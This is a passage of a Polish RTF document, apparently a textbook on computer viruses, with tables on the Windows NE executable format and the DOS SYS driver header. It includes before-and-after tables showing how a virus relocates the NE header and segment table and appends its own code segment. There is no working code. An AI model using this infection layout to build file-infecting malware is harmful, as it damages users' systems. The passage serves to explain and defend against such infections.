\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}02-03}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}rozmiar zasob\'f3w w bajtach}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}04-05}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}flagi zasob\'f3w}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch bit 4: MOVEABLE}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch bit5:SHAREABLE}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch bit 6: PRELOADED     }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}06-07}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0} typ zasob\'f3w;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch =8000 zasoby typu Integer}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}08-0B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}zarezerwowane  }\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Format tablicy odwo\uc1\u322\'b3a\uc1\u324\'f1 do modu\uc1\u322\'b3\'f3w w pliku nowy EXE (NE) dla Windowa}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.6189in/5.9696in/; table-sdh:8938a38}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}ilo\uc1\u347\'9c\uc1\u263\'e6 rekord\'f3w w paczce (0=ko}{\f1\fs24\lang1045{\*\listtag0}niec tablicy)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}01}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}znacznik segmentu:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00 nie u\uc1\u380\'bfywany FF MOVEABLE lub FIXED}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}02}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}kolejne rekordy, ka\uc1\u380\'bfdy o formacie:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00 flagi}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    bit 0: wej\uc1\u347\'9ccie jest eksportowane}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    bit 1: wej\uc1\u347\'9ccie u\uc1\u380\'bfywa globalnych (wsp\'f3\uc1\u322\'b3u\uc1\u380\'bfywalnych) danych}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    bity 7-3: ilo\uc1\u347\'9c\uc1\u263\'e6 st\'f3w parametr\'f3}{\f1\fs24\lang1045{\*\listtag0}w dla segmentu FIXED}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    01-02 ofset dla segmentu MOVEABLE}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    01-02 INT 3F (kod instrukcji: CDh 3Fh) }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 03 numer segmentu }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 05-06 ofset}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Format tablicy nazw rezydentnych/nierezydentnych w pliku nowy EXE (NE) dla }{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.8154in/5.7731in/; table-sdh:89391f8}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 \uc1\u322\'b3a\uc1\u324\'f1cucha (00=konie}{\f1\fs24\lang1045{\*\listtag0}c tablicy) }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}01-N}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\uc1\u322\'b3a\uc1\u324\'f1cuch ASCII }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}N+1-N+2}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}numer porz\uc1\u261\'b9dkowy w tablicy}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wygl\uc1\u261\'b9d zainfekowanego opisan\uc1\u261\'b9 wcze\uc1\u347\'9cniej metod\uc1\u261\'b9 pliku EXE przed i po infekcji przedstawiony zosta\uc1\u322\'b3 w poni\uc1\u380\'bfszych tabelach.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Wygl\uc1\u261\'b9d niezainfekowanego pliku NE dla Windows}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:6.6085in/; table-sdh:893c728}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6 pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}program STUB dla DOS }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Nag\uc1\u322\'b3\'f3wek programu STUB }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Kod programu STUB }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch w\uc1\u322\'b3a\uc1\u347\'9cciwy program dla Windows:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Nag\uc1\u322\'b3\'f3wek NE }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tablica segment\'f3w }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tablice z danymi o zasobach }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Kod programu dla Windows}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Wygl\uc1\u261\'b9d zainfekowanego pliku NE dla Windows}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:6.6085in/; table-sdh:893c058}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6 pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}program STUB dla DOS }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Nag\uc1\u322\'b3\'f3wek programu STUB }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Zmniejszony kod programu STUB }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch w\uc1\u322\'b3a\uc1\u347\'9cciwy program dla Windows zara\uc1\u380\'bfony wirusem:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Nag\uc1\u322\'b3\'f3wek NE, cofni\uc1\u281\'eaty wzgl\uc1\u281\'eadem oryginalnej pozycji}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tablica segment\'f3w, cofni\uc1\u281\'eata wzgl\uc1\u281\'eadem oryginalnej pozycji, rozszerzona przez wirusa o segment wskazuj\uc1\u261\'b9cy na kod wirusa (na ko\uc1\u324\'f1cu pliku)}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tablice z danymi o zasobach }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Kod programu dla Windows }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Kod wirusa}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.3. Pliki zawieraj\uc1\u261\'b9ce sterowniki urz\uc1\u261\'b9dze\uc1\u324\'f1 SYS (BIN, DRV)}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Pliki SYS zawieraj\uc1\u261\'b9 tzw. sterowniki urz\uc1\u261\'b9dze\uc1\u324\'f1 blokowych lub znakowych, kt\'f3re mog\uc1\u261\'b9 rozszerza\uc1\u263\'e6 mo\uc1\u380\'bfliwo\uc1\u347\'9cci systemu DOS. Sterowniki te s\uc1\u261\'b9 \uc1\u322\'b3adowane tylko raz, w momencie startu systemu, na podstawie polece\uc1\u324\'f1 zawartych w pliku CONFIG.SYS (w Windows 95 tak\uc1\u380\'bfe na podstawie MSDOS.SYS). Do \uc1\u322\'b3adowania sterownik\'f3w DOS wykorzystuje funkcj\uc1\u281\'ea (4B00/21),}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}a wi\uc1\u281\'eac t\uc1\u281\'ea sam\uc1\u261\'b9, co w przypadku program\'f3w EXE i COM, jednak dla uruchamianego sterownika nie jest tworzony blok wst\uc1\u281\'eapny programu (PSP).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Na pocz\uc1\u261\'b9tku plik\'f3w typu SYS znajduje si\uc1\u281\'ea sformatowany nag\uc1\u322\'b3\'f3wek, zawieraj\uc1\u261\'b9cy dane dla systemu DOS, kt\'f3ry poprzez zawarte w nim informacje mo\uc1\u380\'bfe komunikowa\uc1\u263\'e6 si\uc1\u281\'ea ze sterownikiem. Format pliku SYS i jego nag\uc1\u322\'b3\'f3wka przedstawiono w poni\uc1\u380\'bfszych tabelach.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Zawarto\uc1\u347\'9c\uc1\u263\'e6 pliku SYS}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:6.6085in/; table-sdh:893ab60}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6 }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Nag\uc1\u322\'b3\'f3wek pliku SYS (patrz nast\uc1\u281\'eapna tabela) }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Kod sterownika}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Format nag\uc1\u322\'b3\'f3wka pliku SYS}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.6189in/5.9696in/; table-sdh:893cde0}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00-03}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Wska\uc1\u378\'9fnik do nast\uc1\u281\'eapnego programu obs\uc1\u322\'b3ugi urz\uc1\u261\'b9dzenia, standardowo == 0FFFFFFFFh, co jest sygna\uc1\u322\'b3em dla systemu, i\uc1\u380\'bf plik zawiera tylko 1 sterownik. Gdyby plik zawiera\uc1\u322\'b3 wi\uc1\u281\'eacej sterownik\'f3w, w polu tym by\uc1\u322\'b3by zawarty adres kolejnego sterownika w pliku.}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}04-05}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Atrybuty ur}{\f0\fs24\lang1045{\*\listtag0}z\uc1\u261\'b9dzenia, informuj\uc1\u261\'b9 o przeznaczeniu sterownika}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}06-07}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Adres procedury strategii (wzgl\uc1\u281\'eadem pocz\uc1\u261\'b9tku nag\uc1\u322\'b3\'f3wka). Procedura strategii s\uc1\u322\'b3u\uc1\u380\'bfy do odebrania pakietu zlecenia od systemu DOS.}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}08-09}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
